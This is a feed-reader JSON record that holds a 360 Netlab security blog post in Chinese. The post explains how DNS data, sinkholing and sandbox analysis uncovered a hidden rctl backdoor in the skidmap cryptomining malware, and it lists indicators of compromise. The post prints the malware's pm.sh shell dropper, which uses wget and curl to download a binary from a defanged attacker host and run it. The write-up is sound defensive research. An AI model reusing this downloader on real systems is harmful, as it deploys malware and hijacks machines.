{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-12-01 22:49:32","updatedTime":"2020-12-01 22:49:32","title":"DNSMon: 用DNS数据进行威胁发现","link":"https://blog.netlab.360.com/use-dns-data-produce-threat-intelligence/","description":"<p><em><strong>----发现skidmap的未知后门</strong></em></p><h2 id=\"-dns-\">用DNS数据做安全</h2><p>DNS协议作为互联网的基础和核心协议，其承载的数据在一定程度上能够反映使用域名提供服务的业务发展情况。使用了DNS服务的恶意行为也不例外，对DNS数据进行安全分析，可以涵盖绝大多数恶意行为。</p><p>早期利用DNS数据进行安全检测典型的场景包括针对DGA和fastflux的检测。尽管检测这两类恶意行为的具体方法多种多样（比如检测DGA域名从少量的统计维度，到多特征的机器学习再到基于时序的深度学习检测等等），但是其核心仍然是以纯DNS数据为基础即可完成检测。能这么做的最主要的原因是这两类恶意行为的关键特征在DNS数据上体现的已经非常明显，几乎不需要或者仅需要少量外部数据的辅助即可以完成快速，准确的检测。</p><p>但现实中不同的恶意软件由于其目的和所运行环境（比如Windows，Linux，macOS等操作系统对协议栈的实现）差异很大，其在DNS数据中留下的痕迹也各不相同，此时<strong>仅依靠DNS数据</strong>就难以或者说是几乎不可能高效的完成从数据清洗，聚合，检测，校验和防御的闭环。面对海量DNS数据（其他的基础数据也类似）利用大数据分析方法产出的多如牛毛的（异常）线索但无法对其进行精确定性的威胁情报（IOC）的尴尬局面。</p><p>在数据，算力和机器智能算法快速发展的今天，我们相信DNS安全未来的一个方向是海量DNS基础数据结合其他多种维度数据进行关联整合，从而进入更深入精细的分析。</p><blockquote><em>其实利用DNS数据发现和阻断安全风险的趋势正变得越来越主流。这些年我们看到越来越多的企业甚至国家(没错，国家)把目光转向了DNS这个领域。比如美国的E3A计划，英国，澳大利亚各自正在实施的5年网络安全战略规划[3][4]，加拿大CIRA的加拿大盾项目[5]，在其防御手段中，核心是一样的，即利用DNS的数据，在国家层面进行大规模的威胁发现和全局阻断。有兴趣的可以查阅文末的参考资料以及其他相关资料。</em></blockquote><h2 id=\"dnsmon-\">DNSMon系统</h2><p>2014年，我们在国内建立第一个<a href=\"https://passivedns.cn\">PassiveDNS</a>系统开始，360netlab团队在DNS领域专心经营了6年。DNSMon是360Netlab利用丰富的DNS安全分析经验，对每日千亿级别的DNS流量进行系统的分析，产出威胁情报(域名IOC)，并向最终用户提供安全防御的平台。</p><ul><li>其核心在于将海量的DNS数据与360所拥有安全相关数据（包括whois，web，沙箱，蜜罐，证书等等）交叉对比，并从中分析得出威胁情报IOC。</li><li><strong>无任何先验知识的情况下，大规模的主动阻断高风险，高危安全相关域名。</strong></li><li>每天可以产生上千条恶意和高可疑域名黑名单，服务于国内约2000万用户，并已稳定运行近3年。</li></ul><h2 id=\"-\">不同维度数据交叉会产生更好的效果</h2><p>一般认为，如果以威胁情报（域名IOC）的生产为目标的话，安全分析团队和安全产品通常会寻求能够产出更为精准威胁情报（域名IOC）的方法，比如沙箱，蜜罐等等，毕竟它们是有切实的真相（groudtruth）——即样本——在手的。通过对样本进行逆向几乎可以解释一切行为。<br>不过逆向工程也面临着挑战：</p><ul><li>首先是无法大规模的扩展和快速的响应。解决这两个问题的办法也许就是跑沙箱。但是沙箱也有自身的问题，比如运行环境的适配问题，恶意软件的对抗问题等等。</li><li>其次是能够拿到并分析样本本身是有较高资源要求的。网络规模越大，组网环境越复杂，部署、运营、阻断等资源要求会显著加大。</li></ul><p>而DNSMon在大规模的扩展和快速响应方面有着天然的优势，并且接入数据量和后端检测平台的复杂度并非线性关系。因此两种手段的结合是必然趋势。</p><p>在运营DNSMon的过程中，现在几乎已经是标准情况，我们拦截的域名往往在几周甚至几个月之后才会进入国内外安全厂家的威胁情报（域名IOC）列表中。为了<strong>让用户更透明的看到</strong>我们从原始DNS流量到威胁情报（域名IOC）的流程，同时也介绍DNSMon在生产威胁情报（域名IOC）方面的经验，后续我们会陆续推出一系列的文章，并挑选其中一些典型的案例来说明如何从DNS入手并结合多维度的数据生产域名IOC。</p><p>本文我们来看第一个例子——skidmap恶意挖矿程序。</p><h2 id=\"dnsmon--1\">DNSMon对未知域名的拦截</h2><p>DNSMon<strong>从2019年5月份开始，在无任何先验知识的情况下，内置算法直接对<em>ipfswallet.tk</em>的rctl-443/rctl/pm等三个子域名以及<em>rctl-443.onlinetalk[.]tk</em> 报黑并进行了拦截</strong>，随后在2019年11月又对 <em>onlinetalk[.]tk</em> 的rctl/info子域名进行了拦截。在2020年的9月份以及10月份的时候，类似的又分别对 <em>googleblockchaintechnology[.]com</em>，<em>howoldareyou999[.]com</em>，<em>franceeiffeltowers[.]com</em> 的rctl-443/rctl子域名进行了拦截。拦截信息见下图：</p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/11/block_domain_info-1.png\" class=\"kg-image\" alt=\"block_domain_info-1\"></figure><p>显然这些域名在域名结构以及子域名的选择上有较强的相似性，子域名的使用是和业务相关，使用相同的子域名很大程度是相同的业务。<br>进一步分析其DNS请求的行为模式，我们发现其DNS请求有非常高的一致性。因为这种模式的域名不断出现，且其行为时间跨度已经接近1年半。经验告诉我们，这种行为模式的背后显然是特定的程序在调控，并且在不停的更新。</p><p>下图展示了从今年8月份以来相关域名的访问曲线。</p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/11/access_curve-1.png\" class=\"kg-image\" alt=\"access_curve-1\"></figure><h2 id=\"--1\">如何定性</h2><h4 id=\"--2\">图关联</h4><p>一般来说，如果域名结构类似，并且使用了相同的基础设施，那么很有可能这些域名在程序实现上扮演的功能是类似的。为此，我们使用图系统（360netlab开发的对多维度数据进行图关联分析的系统）对这些自动拦截的域名的基础设施和关联情况进行了分析。从下图中可以直观的看出：</p><ul><li>所有查询域名（第二列的五角星节点）能够通过IP，URL和样本完成互相之间的关联，说明它们在基础设施上确实是一家。</li><li>同时还扩展出一些新的节点，其中的域名节点有明显的挖矿域名特征，而样本节点则关联出shell脚本和ELF样本，同样符合挖矿恶意程序的基本构成。</li></ul><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/11/graph_relations_layers-3.png\" class=\"kg-image\" alt=\"graph_relations_layers-3\"></figure><h4 id=\"--3\">域名关联</h4><p>根据2019年9月份<a href=\"https://www.trendmicro.com/en_us/research/19/i/skidmap-linux-malware-uses-rootkit-capabilities-to-hide-cryptocurrency-mining-payload.html\">趋势科技的报告</a>[1]可以判断，扩展出来的这两组域名均为skidmap恶意挖矿程序。由此基本可以确定rctl系列域名和skidmap挖矿程序有着密切的关联，并且<strong>DNSMon针对skidmap恶意挖矿程序相关域名（包括作为恶意程序的主下载域名<em>pm[.]ipfswallet.tk</em>）的拦截在时间上比趋势科技的安全分析报告早了大概4个月（2019.5 VS 2019.9）</strong>。</p><h4 id=\"url-\">URL关联</h4><p>经过图关联和域名关联的分析，我们可以确定新出现的域名和skidmap恶意挖矿程序有着极为密切的关系。但是由于之前的分析报告尚未对rctl系列域名做过任何相关的分析。<br>因此为了进一步确定这些新域名的功能，我们使用新的域名拼接旧的URL检查新域名是否在承接相应旧域名的功能。果然，相应的恶意软件是可以成功下载的。</p><pre><code>hxxp://rctl.googleblockchaintechnology[.]com/pc\nhxxp://rctl.googleblockchaintechnology[.]com/pm.sh\nhxxp://rctl.googleblockchaintechnology[.]com/miner2\nhxxp://rctl.googleblockchaintechnology[.]com/miner\nhxxp://rctl.googleblockchaintechnology[.]com/cos6.tar.gz\nhxxp://rctl.googleblockchaintechnology[.]com/cos7.tar.gz\n</code></pre><p>并且下载回来的样本和之前分析文章中通过主下载域名(<em>pm[.]ipfswallet.tk</em>)分析的大体相同。举例pm.sh的内容如下：</p><pre><code>PATH=$PATH:/usr/bin:/bin:/sbin:/usr/sbin:/usr/local/bin:/usr/local/sbin\n\ncd /var/lib\n\n\nif [ -x \"/usr/bin/md5sum\" -o -x \"/bin/md5sum\" ];then\n    sum=`md5sum pc|grep 42d271982608bd740bf8dd3458f79116|grep -v grep |wc -l`\n    if [ $sum -eq 1 ]; then\n        chmod +x /var/lib/pc\n        /var/lib/pc\n        exit 0\n    fi\nfi\n\n/bin/rm -rf /var/lib/pc\nif [ -x \"/usr/bin/wget\"  -o  -x \"/bin/wget\" ]; then\n   wget -c hxxp://pm.cpuminerpool[.]com/pc -O /var/lib/pc &#38;&#38; chmod +x /var/lib/pc &#38;&#38; /var/lib/pc\nelif [ -x \"/usr/bin/curl\"  -o  -x \"/bin/curl\" ]; then\n   curl -fs hxxp://pm.cpuminerpool[.]com/pc -o /var/lib/pc &#38;&#38; chmod +x /var/lib/pc &#38;&#38; /var/lib/pc\nelif [ -x \"/usr/bin/get\"  -o  -x \"/bin/get\" ]; then\n   get -c hxxp://pm.cpuminerpool[.]com/pc -O /var/lib/pc &#38;&#38; chmod +x /var/lib/pc &#38;&#38; /var/lib/pc\nelif [ -x \"/usr/bin/cur\"  -o  -x \"/bin/cur\" ]; then\n   cur -fs hxxp://pm.cpuminerpool[.]com/pc -o /var/lib/pc &#38;&#38; chmod +x /var/lib/pc &#38;&#38; /var/lib/pc\nelif [ -x \"/usr/bin/url\"  -o  -x \"/bin/url\" ]; then\n   url -fs hxxp://pm.cpuminerpool[.]com/pc -o /var/lib/pc &#38;&#38; chmod +x /var/lib/pc &#38;&#38; /var/lib/pc\nelse\n   rpm -e --nodeps wget\n   yum -y install wget\n   wget -c hxxp://pm.cpuminerpool[.]com/pc -O /var/lib/pc &#38;&#38; chmod +x /var/lib/pc &#38;&#38; /var/lib/pc\nfi\n</code></pre><h2 id=\"--4\">定量来看</h2><h4 id=\"sinkhole-\">sinkhole的数据</h4><p>注意到2020年10月底新出现的2个rctl系列域名（<em>howoldareyou999[.]com</em>，<em>franceeiffeltowers[.]com</em>）并没有注册，但实际网络中已经有了大量的针对它们的DNS请求流量。由于之前的分析报告中，<strong>完全没有rctl系列域名的任何信息分析</strong>，为了弄清楚这些域名在实际网络中的切实请求，我们注册了其中的<em>franceeiffeltowers[.]com</em>，并对其做了sinkhole。</p><blockquote><em><a href=\"https://en.wikipedia.org/wiki/DNS_sinkhole\">Sinkhole技术</a>是指安全分析人员为了分析或者阻断恶意程序的传播，对恶意程序使用的域名进行注册或者重定向，将其流量导入到安全分析人员控制的机器上，是安全分析人员对抗恶意软件的一种有效手段。该技术同时也是<strong>低成本，大规模</strong>的关停僵尸网络业务的首选（2014年微软和FBI<a href=\"https://blogs.microsoft.com/blog/2014/06/02/microsoft-helps-fbi-in-gameover-zeus-botnet-cleanup/\">关停GOZ僵尸网络</a>使用的关键技术之一就是对GOZ的域名做了sinkhole）。<br>简单来说，当一个僵尸网络中的肉鸡向服务器发送数据时，就可以使用sinkhole技术将这些数据流量进行有目的的转发，以此来对僵尸网络进行监控、查找受到影响的域IP地址，最终瓦解僵尸网络的攻击，让那些肉鸡无法接受命令。<br>最为大众熟知的sinkhole当属2017年5月，wannacry爆发时安全研究人员针对其开关域名进行注册，做sinkhole处理，成功的阻断了wannacry勒索软件大规模传播，减少了其所造成的损失。<br>DNSMon在产生IOC的过程中，360netlab维护的基础sinkhole数据库一直在发挥着重要的作用。</em></blockquote><p>经过观察，发现实际到<em>franceeiffeltowers[.]com</em>的流量和到主下载域名<em>pm[.]ipfswallet.tk</em>的流量有很大的差别，主要体现在：</p><ol><li>通过443端口进行通信</li><li>需要完成TLS协议的交互，但是没有对访问域名的证书进行校验（我们提供的证书和sinkhole域名的证书并不匹配）</li><li>TLS握手之后，收到首包的payload长度为39，内容类似如下（不同客户端来源的数据包的字节的内容会有变化）：</li></ol><pre><code>00000000: 64 65 66 61 75 6C 74 00  00 00 00 00 00 00 00 00  default.........\n00000010: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................\n00000020: 00 00 16 3E 12 AE AD                              ...&#62;...\n</code></pre><p>或者类似如下：</p><pre><code>00000000: 63 34 00 00 00 00 00 00  00 00 00 00 00 00 00 00  c4..............\n00000010: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................\n00000020: 00 52 54 00 B8 EB E1                              .RT....\n</code></pre><p>这些内容的显然和我们期望看到的可读性很好的http url以及相应的http协议的其他内容，反而看起来像是某种远控程序的上线包。</p><h5 id=\"--5\">客户端主要集中在阿里云与腾讯云</h5><p>通过sinkhole域名，在2020-11-13，我们拿到了689个IP地址，其中64%的请求来源IP集中在阿里云和腾讯云上。具体分布如下图：</p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/11/client_ip_distr.png\" class=\"kg-image\" alt=\"client_ip_distr\"></figure><p>因为rctl系列域名（无论是否注册）在请求模式上互相之间非常接近，并且通过DNSMon系统能够看到他们的伴生关系非常紧密。我们有充足的理由相信已注册的域名（<em>googleblockchain[.]com</em>）的客户端来源与sinkhole的域名相同。</p><h5 id=\"sinkhole--1\">sinkhole的请求数量</h5><p>请求数量方面，在2020.11.13 23:00 ~2020.11.14 23:00 时间段内，sinkhole服务器共收到了93.6万次上线请求（长度为39的二进制数据包）。</p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/11/sinkhole_req_count.png\" class=\"kg-image\" alt=\"sinkhole_req_count\"></figure><h4 id=\"--6\">寻找失落的源，找到了答案</h4><p>尽管从前面的多种关联来看，几乎可以肯定rctl系列域名必然是和skidmap恶意挖矿程序相关的。但是sinkhole的数据显示rctl系列域名和已经披露的skidmap相关的IOC域名角色并不相同。</p><p>为了弄清楚这种流量的真实来源，我们在受限环境中，重新“感染”了一次skidmap。不出所料的发现了针对rctl系列域名的请求，通过分析发现是一个名叫 <code>/usr/bin/irqbalanced (ad303c1e121577bbe67b4615a0ef58dc5e27198b)</code> 的程序在不断的尝试的对外连接rctl* 类域名，并且注意到<strong>rctl相关的字符串也在skidmap的rootkit隐藏的目录列表中</strong>。</p><p>通过对该程序的分析发现它来自一个开源的远程控制软件<a href=\"https://github.com/ycsunjane/rctl\">rctl</a>（注：该软件的作者和skidmap的背后黑客不能因为该开源软件的关系而被认为是同一个人），并对其客户端程序进行了修改以适应skidmap的需求。不过，通信的核心协议并未发生变化，sinkhole最初收到的长度为39字节的数据就是受害者尝试连接主控的首包。<br>至此，真相大白：<strong>rctl系列域名是skidmap恶意挖矿程序的又一个后门</strong>。只因为最初的分析报告中没有提及此域名，导致现在<strong>几乎所有的威胁情报平台对rctl系列域名以及后门程序irqbalanced样本本身都没有加入IOC列表</strong>。</p><p>因为通信协议没有明显的变化，我们对rctl服务端软件稍作修改进行适配，在sinkhole服务器上运行其服务端之后，不出所料的收到众多的受害者的信息。</p><p>从软件运行的截图来看，该控制端可以对受害者可以进行批量的远程命令执行和单点的shell的登录，其功能说明和运行截图如下：</p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/11/rctl_server_v2-3.png\" class=\"kg-image\" alt=\"rctl_server_v2-3\"></figure><p>该远控软件的连接效率很高，服务端启动不久，连接的客户端已经接近900台。考虑到客户端连接时请求主控域名的顺序问题，真实的受害用户可能比这个数量要高不少。</p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/11/rctl_server_v3-1.jpg\" class=\"kg-image\" alt=\"rctl_server_v3-1\"></figure><h4 id=\"-ioc\">确认丢失了IOC</h4><p>考虑到skidmap恶意挖矿程序自身的进化，有一种可能当时分析报告的版本并没有该后门，是后来添加进去的。<br>为了确认此种情况，我们通过virustotal查询了当时分析文章所提供IOC中的kaudited（<a href=\"https://www.virustotal.com/gui/file/e6eb4093f7d958a56a5cd9252a4b529efba147c0e089567f95838067790789ee/behavior\">e6eb4093f7d958a56a5cd9252a4b529efba147c0e089567f95838067790789ee</a>\t）（正是该程序释放了irqbalanced以及其他的恶意程序），确认此后门在当时版本就存在。</p><p><strong>从趋势科技对skidmap进行详尽的分析算起，已经过去了1年多，多家IOC生产机构，却都漏掉了rctl这种重要的IOC，对此我们并不意外</strong>。<br>安全防御没有银弹，利用包括像DNSMon这种平台等多种分析手段，多数据源的交叉才能够尽量好的解决这种问题。</p><h2 id=\"\">感染过程</h2>\n<p>关于skidmap利用什么漏洞进入系统，下载了哪些恶意程序(rootkit)，每个恶意程序的功能以及他们之间的关系，不在本文赘述。后续我们考虑用一篇专门的文章来进行具体的介绍。</p>\n<p>至此，本文基本结束，做一个简要的概括。</p><h2 id=\"--7\">结论</h2><ol><li>DNSMon系统能够很好的发现各种已知和未知的威胁，通过多维度数据交叉校验之后，对其判黑和高可疑数据进行拦截。</li><li>DNSMon系统产生的黑和高可疑IOC，对安全要求比较高的用户来说是非常有价值，是对现有依据传统安全分析方法产生的威胁情报(IOC)很好的互补。</li><li>skidmap恶意挖矿程序存在着一个之前一直存在但从未批露的漏洞，新的IOC需要补充进来。</li><li>skidmap恶意挖矿程序的受害用户在国内目前大多数来自与云平台，主要集中在阿里云和腾讯云。</li></ol><h2 id=\"--8\">参考资料</h2><ol><li><a href=\"https://www.trendmicro.com/en_us/research/19/i/skidmap-linux-malware-uses-rootkit-capabilities-to-hide-cryptocurrency-mining-payload.html\">https://www.trendmicro.com/en_us/research/19/i/skidmap-linux-malware-uses-rootkit-capabilities-to-hide-cryptocurrency-mining-payload.html</a></li><li><a href=\"https://github.com/ycsunjane/rctl\">https://github.com/ycsunjane/rctl</a></li><li><a href=\"https://assets.publishing.service.gov.uk/government/uploads/system/uploads/attachment_data/file/567242/national_cyber_security_strategy_2016.pdf\">https://assets.publishing.service.gov.uk/government/uploads/system/uploads/attachment_data/file/567242/national_cyber_security_strategy_2016.pdf</a></li><li><a href=\"https://www.homeaffairs.gov.au/cyber-security-subsite/files/cyber-security-strategy-2020.pdf\">https://www.homeaffairs.gov.au/cyber-security-subsite/files/cyber-security-strategy-2020.pdf</a></li><li><a href=\"https://www.cira.ca/cybersecurity-services/canadian-shield\">https://www.cira.ca/cybersecurity-services/canadian-shield</a></li></ol><h2 id=\"ioc\">IOC</h2><p><em>注：本IOC列表仅包含DNSMon系统发现的且之前分析报告没有提及的域名IOC以及本次分析流程中识别出的其他类型的IOC。</em></p><pre><code>域名：\nrctl-443.franceeiffeltowers[.]com\nrctl-443.googleblockchaintechnology[.]com\nrctl-443.howoldareyou999[.]com\nrctl-443.ipfswallet[.]tk\nrctl-443.onlinetalk[.]tk\nrctl.franceeiffeltowers[.]com\nrctl.googleblockchaintechnology[.]com\nrctl.howoldareyou999[.]com\nrctl.ipfswallet[.]tk\nrctl.onlinetalk[.]tk\n\n样本：\necb6f50245706cfbdc6d2098bc9c54f3  irqbalanced\n9c129d93f6825b90fa62d37b01ae3b3c  pamdicks\n5840dc51673196c93352b61d502cb779  ip6network\n871a598f0ee903b4f57dbc5020aae293  systemd-network\n\n证书：\n4241c714cd2b04f35e49ed593984c6932e1f387c   rctl.onlinetalk[.]tk\n3158b9c2e703a67363ac9ee9c1b247c2e1abf4c7   rctl.onlinetalk[.]tk\n5fbad62b7738c76094ab6a05b32425305400183f   onlinetalk[.]tk\ne886e1899b636f2875be56b96cf1affdd957348a   googleblockchaintechnology[.]com\n\n目录文件：\n/etc/rctlconf/rctlcli.cfg\n/etc/rctlconf/certs/rctl_cert.pem\n/etc/rctlconf/certs/rctl_priv.pem\n/etc/rctlconf/certs/rctl_ca.crt\n\nssh登录公钥：\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/cjOtK8LAcIPBchQkU/qKSGbe7A9MTvrwqBc6trso6UMBpeTWY8loM1082h4HZ4daNJ1S8yB57PtOHSUwG//SD5ahYfOTOInQpU5p7mnczql9UPXO68VXukBpbmjueEwVtXXFnd/9kZzqBroS9zMakKh53URPoKus4d/V7Ct5ecPSo2WDRJDLbewE9ojb+v4R8C4xartjNLsyUXRwqgk1B6LK8JKIWUU55+LoaecFTBoBil+DP2Wxl2RhFaGCHItInwPgmtigYcOH/zMePw+aiXsYMbSzNtQswh3E0h7bpxq7hgilFTglfmrZybF45enkjwr9cfsWpkQ6NQ1nONA9 root@doclever\n</code></pre>","descriptionType":"html","publishedDate":"Wed, 25 Nov 2020 04:53:23 +0000","feedId":9360,"bgimg":"https://blog.netlab.360.com/content/images/2020/11/block_domain_info-1.png","linkMd5":"e0bd019b8f21d510803efdf22aa1a013","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn46@2020_1/2020/12/01/14-49-38-717_bd8a97780073e2e5.webp","destWidth":676,"destHeight":446,"sourceBytes":161304,"destBytes":34098,"author":"Zhang Zaifeng","articleImgCdnMap":{"https://blog.netlab.360.com/content/images/2020/11/block_domain_info-1.png":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn46@2020_1/2020/12/01/14-49-38-717_bd8a97780073e2e5.webp","https://blog.netlab.360.com/content/images/2020/11/access_curve-1.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn70@2020_5/2020/12/01/14-49-45-399_d11f34814035d49d.webp","https://blog.netlab.360.com/content/images/2020/11/graph_relations_layers-3.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn49@2020_5/2020/12/01/14-49-57-135_7862d1b5369efe8a.webp","https://blog.netlab.360.com/content/images/2020/11/client_ip_distr.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn62@2020_3/2020/12/01/14-49-43-124_76322ab59e4f75e1.webp","https://blog.netlab.360.com/content/images/2020/11/sinkhole_req_count.png":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn65@2020_3/2020/12/01/14-49-44-117_0aeb98def7049a3b.webp","https://blog.netlab.360.com/content/images/2020/11/rctl_server_v2-3.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn56@2020_3/2020/12/01/14-49-48-426_133be10fd529a6af.webp","https://blog.netlab.360.com/content/images/2020/11/rctl_server_v3-1.jpg":null},"publishedOrCreatedDate":1606834172921}],"record":{"createdTime":"2020-12-01 22:49:32","updatedTime":"2020-12-01 22:49:32","feedId":9360,"fetchDate":"Tue, 01 Dec 2020 14:49:32 +0000","fetchMs":7697,"handleMs":74,"totalMs":35482,"newArticles":0,"totalArticles":15,"status":1,"type":0,"ip":"25831ba229ab386e6c9fb33b53312d7f","hostName":"us-007*","requestId":"13e7e869d285464ea1f3633abc469498_9360","contentType":"text/xml; charset=utf-8","totalBytes":231252,"bgimgsTotal":1,"bgimgsGithubTotal":1,"articlesImgsTotal":7,"articlesImgsGithubTotal":6,"successGithubMap":{"myreaderx27":1,"myreaderx4":1,"myreaderx2":1,"myreaderx13":1,"myreaderx1":1,"myreaderx18":1},"failGithubMap":{"myreaderx23":1}},"feed":{"createdTime":"2020-08-25 04:35:03","updatedTime":"2020-09-05 15:59:59","id":9360,"name":"360 Netlab Blog - Network Security Research Lab at 360","url":"http://blog.netlab.360.com/rss/","subscriber":null,"website":null,"icon":"https://blog.netlab.360.com/favicon.png","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx64/cdn16@2020_1/2020/09/05/07-59-55-602_11aad37390d7d139.png","description":"Network Security Research Lab at 360","weekly":null,"link":null},"noPictureArticleList":[{"createdTime":"2020-12-01 22:49:58","updatedTime":"2020-12-01 22:49:58","id":null,"feedId":9360,"linkMd5":"e0bd019b8f21d510803efdf22aa1a013"}],"tmpCommonImgCdnBytes":34098,"tmpBodyImgCdnBytes":197154,"tmpBgImgCdnBytes":0,"extra4":{"start":1606834162997,"total":0,"statList":[{"spend":9850,"msg":"获取xml内容"},{"spend":74,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":18564,"msg":"正文链接上传到cdn"}]},"extra5":7,"extra6":7,"extra7ImgCdnFailResultVector":[{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/11/rctl_server_v3-1.jpg","sourceStatusCode":200,"destWidth":304,"destHeight":805,"sourceBytes":64736,"destBytes":49642,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":4627,"convertSpendMs":16,"createdTime":"2020-12-01 22:49:39","host":"us-021*","referer":"https://blog.netlab.360.com/use-dns-data-produce-threat-intelligence/","linkMd5ListStr":"e0bd019b8f21d510803efdf22aa1a013","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx23/cdn54/contents/2020/12/01/14-49-44-514_14507e1e724d054c.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 69189253.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Tue, 01 Dec 2020 14:49:44 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["8BB4:2573:6F51D6:C1FE57:5FC65800"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1606836451"],"x-ratelimit-used":["60"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx23/cdn54/contents/2020/12/01/14-49-44-514_14507e1e724d054c.webp","historyStatusCode":[],"spendMs":46},"base64UserPassword":null,"token":"df0b9******************************93a6e"},"githubUser":"myreaderx23","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"63.2 KB","destSize":"48.5 KB","compressRate":"76.7%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/11/rctl_server_v3-1.jpg","sourceStatusCode":200,"destWidth":304,"destHeight":805,"sourceBytes":64736,"destBytes":49642,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":1890,"convertSpendMs":16,"createdTime":"2020-12-01 22:49:44","host":"us-021*","referer":"https://blog.netlab.360.com/use-dns-data-produce-threat-intelligence/","linkMd5ListStr":"e0bd019b8f21d510803efdf22aa1a013","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx23/cdn54/contents/2020/12/01/14-49-46-395_14507e1e724d054c.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 69189253.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Tue, 01 Dec 2020 14:49:46 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["8BB4:2573:6F52C2:C205CE:5FC65808"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1606836451"],"x-ratelimit-used":["60"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx23/cdn54/contents/2020/12/01/14-49-46-395_14507e1e724d054c.webp","historyStatusCode":[],"spendMs":63},"base64UserPassword":null,"token":"df0b9******************************93a6e"},"githubUser":"myreaderx23","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"63.2 KB","destSize":"48.5 KB","compressRate":"76.7%"}],"extra10_invalidATagHrefValue":{},"extra111_proxyServerAndStatMap":{"http://europe-56.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-021.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-010.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe-22.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-022.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe-60.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/11/block_domain_info-1.png","sourceStatusCode":200,"destWidth":676,"destHeight":446,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn46@2020_1/2020/12/01/14-49-38-717_bd8a97780073e2e5